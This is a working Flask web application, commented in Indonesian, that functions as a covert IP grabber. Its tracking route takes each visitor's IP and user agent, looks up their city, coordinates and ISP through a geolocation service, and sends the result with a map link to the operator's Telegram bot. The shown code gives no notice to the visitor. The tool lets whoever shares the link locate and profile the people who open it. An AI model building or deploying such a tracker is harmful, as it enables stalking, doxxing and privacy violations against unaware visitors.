from flask import Flask, render_template, request, jsonify
import requests
import os
from datetime import datetime

app = Flask(__name__, 
            template_folder='../templates',
            static_folder='../static')

# ============ KONFIGURASI ============
# Baca dari environment variable
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

# ============ FUNCTIONS ============

def get_client_ip():
    headers_to_check = [
        'CF-Connecting-IP',      # Cloudflare
        'X-Vercel-Forwarded-For', # Vercel
        'X-Forwarded-For',
        'X-Real-IP',
        'True-Client-IP',
    ]
    
    for header in headers_to_check:
        ip = request.headers.get(header)
        if ip:
            ip = ip.split(',')[0].strip()
            if ip and not ip.startswith(('127.', '10.', '192.168.', '172.', '::1')):
                return ip
    
    return request.remote_addr

def get_ip_info(ip):
    try:
        url = f'http://ip-api.com/json/{ip}' if ip else 'http://ip-api.com/json/'
        fields = 'status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query'
        response = requests.get(f'{url}?fields={fields}', timeout=10)
        return response.json()
    except Exception as e:
        return {"status": "error", "message": str(e)}

def send_to_telegram(data):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[ERROR] Token atau Chat ID kosong!")
        return False
    
    def safe(key, default='N/A'):
        val = data.get(key)
        return str(val) if val else default
    
    ip_addr   = safe('query')
    country   = safe('country')
    region    = safe('regionName')
    city      = safe('city')
    lat       = safe('lat')
    lon       = safe('lon')
    isp       = safe('isp')
    org       = safe('org')
    timezone  = safe('timezone')
    timestamp = safe('timestamp')
    ua        = safe('user_agent', 'Unknown')[:200]
    
    maps_link = ""
    if lat != 'N/A' and lon != 'N/A':
        maps_link = f"\n\n🗺 <a href='https://www.google.com/maps?q={lat},{lon}'>Lihat di Google Maps</a>"
    
    # Pakai HTML bukan Markdown (lebih stabil)
    message = f"""🔴 <b>NEW VISITOR</b>

📅 Waktu: {timestamp}
🌐 IP: <code>{ip_addr}</code>
📍 Lokasi: {city}, {region}, {country}
🗺 Koordinat: {lat}, {lon}
📡 ISP: {isp}
🏢 Org: {org}
🕐 Timezone: {timezone}

📱 <b>User Agent:</b>
<code>{ua}</code>{maps_link}"""
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML',
        'disable_web_page_preview': False
    }
    
    try:
        response = requests.post(url, json=payload, timeout=15)
        result = response.json()
        
        if result.get('ok'):
            print("[SUCCESS] Terkirim ke Telegram!")
            return True
        else:
            print(f"[ERROR] Telegram: {result.get('description')}")
            
            # Fallback: kirim tanpa parse_mode
            payload['parse_mode'] = None
            payload['text'] = f"NEW VISITOR\nIP: {ip_addr}\nLokasi: {city}, {country}\nISP: {isp}\nWaktu: {timestamp}"
            r2 = requests.post(url, json=payload, timeout=15)
            return r2.json().get('ok', False)
            
    except Exception as e:
        print(f"[ERROR] Exception: {e}")
        return False

# ============ ROUTES ============

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/favicon.ico')
def favicon():
    return '', 204

@app.route('/api/track', methods=['GET', 'POST'])
def track():
    client_ip  = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer    = request.headers.get('Referer', 'Direct')
    
    ip_info = get_ip_info(client_ip)
    ip_info['user_agent'] = user_agent
    ip_info['timestamp']  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip_info['detected_ip'] = client_ip
    ip_info['referer']    = referer
    
    telegram_sent = send_to_telegram(ip_info)
    ip_info['telegram_sent'] = telegram_sent
    
    return jsonify(ip_info)

@app.route('/api/test-telegram', methods=['GET'])
def test_telegram():
    test_data = {
        'query'      : '8.8.8.8',
        'country'    : 'United States',
        'regionName' : 'California',
        'city'       : 'Mountain View',
        'lat'        : '37.4056',
        'lon'        : '-122.0775',
        'isp'        : 'Google LLC',
        'org'        : 'Google Public DNS',
        'timezone'   : 'America/Los_Angeles',
        'timestamp'  : datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'user_agent' : 'Test Agent'
    }
    sent = send_to_telegram(test_data)
    return jsonify({
        'test_message_sent' : sent,
        'token_ada'         : bool(TELEGRAM_BOT_TOKEN),
        'chat_id_ada'       : bool(TELEGRAM_CHAT_ID),
    })

# Vercel otomatis pakai objek 'app' ini
# TIDAK perlu fungsi handler()
